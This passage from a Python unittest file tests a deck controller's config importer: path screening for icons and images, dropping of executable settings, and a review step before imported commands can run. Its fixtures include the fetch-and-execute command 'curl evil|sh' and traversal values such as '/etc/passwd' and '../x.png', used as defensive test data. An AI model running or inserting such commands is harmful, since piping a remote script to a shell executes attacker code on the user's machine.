                                                "dials": [{"icon": "~/x.png"}]}}}},
            "keys": {"saved": {"icon": "../x.png", "active": {"icon": evil}, "on": {"icon": "emoji:x"}}},
            "pages": {"q": [{"label": "S", "icon": "mic", "active": {"icon": evil, "bg": "#c00"},
                             True: {"icon": "/a.png"}}]}})
        self.assertEqual(dropped, ["8x4/main/0.0.icon", "5x3/m/0.icon", "keys/saved.icon", "keys/saved.active.icon",
                                   "q/S.active.icon", "q/S.True.icon"])
        self.assertEqual(cfg["layouts"]["5x3"]["pages"]["m"]["keys"][0]["icon"], "mic")
        self.assertEqual(cfg["keys"]["saved"], {"active": {}, "on": {"icon": "emoji:x"}})
        self.assertEqual(cfg["pages"]["q"][0], {"label": "S", "icon": "mic", "active": {"bg": "#c00"}, True: {}})

    def test_key_image_is_screened_like_icon(self):
        cfg, dropped = importer.sanitize({
            "pages": {"p": [{"label": "a", "image": "bg.png"}, {"label": "b", "image": "/etc/x.png"},
                            {"label": "c", "image": "~/x.png", "on": {"image": "../y.png", "bg": "#000"}}]},
            "layouts": {"8x4": {"main": [[{"image": "/z.png"}]]}},
            "keys": {"s": {"image": "../q.png"}}})
        self.assertEqual(dropped, ["p/b.image", "p/c.image", "p/c.on.image", "8x4/main/0.0.image", "keys/s.image"])
        self.assertEqual(cfg["pages"]["p"][0]["image"], "bg.png")
        self.assertEqual(cfg["pages"]["p"][2], {"label": "c", "on": {"bg": "#000"}})
        self.assertEqual(cfg["keys"]["s"], {})

    def test_icon_screen_edge_cases(self):
        self.assertFalse(importer._icon_ok(" emoji:/../../etc/x"))       # the emoji: exemption is for the raw value
        self.assertFalse(importer._icon_ok("emoji:/../../etc/x", "image"))    # and for icons only
        self.assertTrue(importer._icon_ok("emoji:/../x"))                # drawn text, never opened
        self.assertFalse(importer._icon_ok(" /etc/passwd"))
        self.assertFalse(importer._icon_ok("\t~/x.png"))
        for v in (5, 1.5, True, ["a"], {"a": 1}):                        # fail closed on non-text
            self.assertFalse(importer._icon_ok(v), v)
            self.assertFalse(importer._icon_ok(v, "image"), v)
        cfg, dropped = importer.sanitize({"pages": {"p": [{"label": "a", "icon": 5, "image": ["x"]}]}})
        self.assertEqual((cfg["pages"]["p"], dropped), ([{"label": "a"}], ["p/a.icon", "p/a.image"]))

    def test_relative_image_must_stay_inside_icons_folder(self):
        root = tmpdir()
        os.makedirs(os.path.join(root, "icons", "sub"))
        os.symlink("/etc", os.path.join(root, "icons", "out"))
        with mock.patch.object(importer, "ROOT", root):
            self.assertTrue(importer._icon_ok("Pictures/x.png", "image"))   # resolves to icons/Pictures/x.png
            self.assertTrue(importer._icon_ok("sub/x.png", "image"))
            self.assertFalse(importer._icon_ok("out/passwd", "image"))      # symlink out of icons/
            self.assertFalse(importer._icon_ok("out/passwd"))

    def test_relative_image_is_resolved_under_icons_not_cwd(self):
        from core.render import Renderer
        r = Renderer(Deck("Stream Deck XL"), "/app")
        self.assertEqual(r._image_path("Pictures/x.png"), "/app/icons/Pictures/x.png")
        self.assertEqual(r._image_path("/abs/x.png"), "/abs/x.png")
        self.assertEqual(r._image_path("~/x.png"), os.path.expanduser("~/x.png"))

    def test_executable_and_transport_settings_dropped(self):
        cfg, dropped = importer.sanitize({"bambu": {"host": "h", "camera": {"enabled": True, "ffmpeg": "/tmp/evil",
                                                                          "transport": "udp"}}})
        self.assertEqual(dropped, ["bambu.host", "bambu.camera.ffmpeg", "bambu.camera.transport"])
        self.assertEqual(cfg, {"bambu": {"camera": {"enabled": True}}})

    def test_merge_keeps_your_settings(self):
        current = {"home_assistant": {"url": "https://mine", "token_file": "~/mine"}, "obs": {"host": "localhost"}}
        merged, _ = importer.apply(current, self.cfg, {}, fresh=True)
        self.assertEqual(merged["home_assistant"], current["home_assistant"])
        self.assertEqual(merged["obs"], {"host": "localhost", "scene": "Live"})


class UnreviewedNeverRuns(unittest.TestCase):
    def poll_bot(self, cfg):
        bot = show(cfg)
        sh = mock.Mock(return_value=(0, ""))
        clock = mock.Mock(return_value={"label": "12:00"})
        bot.state_providers["cmd"] = lambda cmd, spec: sh(cmd)[0] == 0      # as modules/system.py
        bot.display_providers["twitch_viewers"] = clock
        return bot, sh, clock

    def test_imported_state_never_calls_sh(self):
        cfg, _ = importer.sanitize(copy.deepcopy(EVIL))
        bot, sh, viewers = self.poll_bot(cfg)
        bot.session().poll()
        sh.assert_not_called()
        viewers.assert_not_called()
        self.assertEqual(bot.session().states.get(("main", 0)), None)
        self.assertFalse(bot.check_state(cfg["pages"]["main"][0]["state"]))
        self.assertEqual(bot.read_display(cfg["pages"]["main"][6]["display"]), {})
        sh.assert_not_called()
        # The same page unsanitized would have run it on show: the mock is wired up.
        bot, sh, _ = self.poll_bot(copy.deepcopy(EVIL))
        bot.session().poll()
        sh.assert_called_once_with("curl evil|sh")

    def test_real_sh_is_never_reached(self):
        from modules import system
        with mock.patch.object(system, "sh", return_value=(0, "")) as sh:
            cfg, _ = importer.sanitize(copy.deepcopy(EVIL))
            self.assertFalse(BOT.check_state(cfg["pages"]["main"][0]["state"]))
            sh.assert_not_called()
            self.assertTrue(BOT.check_state(EVIL["pages"]["main"][0]["state"]))   # sanity: patched
            sh.assert_called_once()

    def test_imported_run_is_refused(self):
        cfg, _ = importer.sanitize(copy.deepcopy(EVIL))
        run = mock.Mock()
        with mock.patch.dict(BOT.actions, {"run": run}):
            for i in (1, 2, 7):
                with self.assertRaisesRegex(ValueError, "reviewed"):
                    BOT.run_action(cfg["pages"]["main"][i]["action"])
            with self.assertRaisesRegex(ValueError, "reviewed"):
                BOT.run_action(cfg["keys"]["lock"]["action"])
        run.assert_not_called()


class SafeImportApi(unittest.TestCase):
    def setUp(self):
        with open(CONFIG, "w") as f:
            f.write(yaml.safe_dump({"editor": {"port": PORT}, "brightness": 41,
                                    "home_assistant": {"url": "https://mine"},
                                    "pages": {"main": [{"label": "Mine", "action": {"page": "main"}}]}},
                                   sort_keys=False))

    def test_preview_apply_review(self):
        text = yaml.safe_dump(EVIL, sort_keys=False)
        status, prev = call("/api/import/preview", {"text": text})
        self.assertEqual(status, 200, prev)
        self.assertIn("home_assistant.token_file", prev["dropped_settings"])
        self.assertIn("twitch_bot.database_url", prev["dropped_settings"])
        self.assertNotIn("evil.example", json.dumps(prev["plan"]))
        self.assertEqual(sorted(r["field"] for r in prev["review"]),
                         ["action", "action", "action", "action", "display", "left", "state"])

        status, res = call("/api/import/apply", {"text": text, "choices": {"pages.main": "incoming"},
                                                 "hash": configio.file_hash(CONFIG)})
        self.assertEqual(status, 200, res)
        saved = configio.load(CONFIG)
        self.assertEqual(saved["home_assistant"], {"url": "https://mine"})
        self.assertNotIn("steam", saved)
        self.assertEqual(saved["pages"]["main"][0]["state"], wrapped({"cmd": "curl evil|sh"}))
        self.assertEqual(saved["pages"]["main"][3], EVIL["pages"]["main"][3])
        state = next(r for r in res["review"] if r["field"] == "state")
        self.assertEqual(state["path"], ["pages", "main", 0])
        self.assertEqual(state["kinds"], ["cmd"])
        self.assertIn("curl evil|sh", state["argument"])
        from core.webapi.setup_api import expect_hash
        self.assertEqual(state["expect"], expect_hash({"cmd": "curl evil|sh"}))

        # Enabling is bound to the config's hash and to exactly what was shown.
        body = {"path": state["path"], "field": "state", "hash": res["hash"], "expect": state["expect"]}
        self.assertEqual(call("/api/import/review", body)[0], 400)                     # no enable: true
        self.assertEqual(call("/api/import/review", {**body, "enable": True, "hash": "0" * 64})[0], 409)
        self.assertEqual(call("/api/import/review", {**body, "enable": True, "expect": "a" * 64})[0], 409)
        self.assertEqual(call("/api/import/review", {**body, "enable": True, "path": ["pages", "nope", 0]})[0], 404)
        self.assertEqual(call("/api/import/review", {**body, "enable": True, "path": ["twitch_bot", "x"]})[0], 404)
        self.assertEqual(call("/api/import/review", {**body, "enable": True, "field": "label"})[0], 404)
        self.assertEqual(configio.load(CONFIG), saved)
        status, done = call("/api/import/review", {**body, "enable": True})
        self.assertEqual(status, 200, done)
        self.assertEqual(done["value"], {"cmd": "curl evil|sh"})
        self.assertEqual(done["hash"], configio.file_hash(CONFIG))
        after = configio.load(CONFIG)
        self.assertEqual(after["pages"]["main"][0]["state"], {"cmd": "curl evil|sh"})
        self.assertEqual(after["pages"]["main"][1], saved["pages"]["main"][1])          # one at a time
        self.assertEqual(call("/api/import/review", {**body, "enable": True, "hash": done["hash"]})[0], 409)

        # A dial action and a saved key are enabled the same way.
        for where in (["pages", "twitch", "dials", 0], ["keys", "lock"]):
            it = next(r for r in res["review"] if r["path"] == where)
            status, done = call("/api/import/review", {"path": where, "field": it["field"], "hash": done["hash"],
                                                       "expect": it["expect"], "enable": True})
            self.assertEqual(status, 200, done)
        after = configio.load(CONFIG)
        self.assertEqual(after["pages"]["twitch"]["dials"][0]["left"], {"volume": "down"})
        self.assertEqual(after["keys"]["lock"]["action"], {"run": "loginctl lock-session"})

    def test_existing_review_step_enables_imported_actions(self):
        """A config.yaml import's wrapped key action is enabled by the same /api/setup/review the
        Deck editor's review section uses for the other importers."""
        text = yaml.safe_dump(EVIL, sort_keys=False)
        status, res = call("/api/import/apply", {"text": text, "choices": {"pages.main": "incoming"},
                                                 "hash": configio.file_hash(CONFIG)})
        self.assertEqual(status, 200, res)
        from core.webapi.setup_api import expect_hash
        body = {"page": "main", "key": 1, "hash": res["hash"], "expect": expect_hash({"run": "curl evil|sh"}),
                "enable": True}
        status, done = call("/api/setup/review", body)
        self.assertEqual(status, 200, done)
        self.assertEqual(configio.load(CONFIG)["pages"]["main"][1]["action"], {"run": "curl evil|sh"})

    def test_allow_listed_page_needs_no_review(self):
        text = yaml.safe_dump(SAFE, sort_keys=False)
        status, prev = call("/api/import/preview", {"text": text})
        self.assertEqual(status, 200, prev)
        self.assertEqual((prev["review"], prev["dropped_settings"]), ([], []))
        status, res = call("/api/import/apply", {"text": text, "choices": {"pages.main": "incoming"},
                                                 "hash": configio.file_hash(CONFIG)})
        self.assertEqual(status, 200, res)
        self.assertEqual(res["review"], [])
        saved = configio.load(CONFIG)
        self.assertEqual(saved["pages"], SAFE["pages"])


if __name__ == "__main__":
    unittest.main()
